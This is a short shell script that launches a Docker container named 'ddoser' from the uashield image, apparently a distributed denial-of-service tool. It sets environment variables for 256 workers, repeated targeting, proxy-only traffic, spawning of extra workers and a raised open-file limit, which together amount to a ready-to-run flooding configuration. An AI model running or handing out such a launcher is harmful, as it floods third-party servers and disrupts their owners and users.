#!/bin/sh
ulimit -n 100000
docker run -d --rm --name ddoser \
    -e REPEATERSPAWNNEWWORKERSCOUNT=256 \
    -e REPEATSLEEPBEFORE=50 \
    -e REPEATTARGET=true \
    -e TARGETONLY200=true \
    -e ONLYOK=true \
    -e ONLYPROXY=true \
    -e WORKERS=256 \
    -e DISGUISEASBOTPERCENTAGE=0 \
    -e TIMEOUT=5000 ghcr.io/opengs/uashield:0.0.x
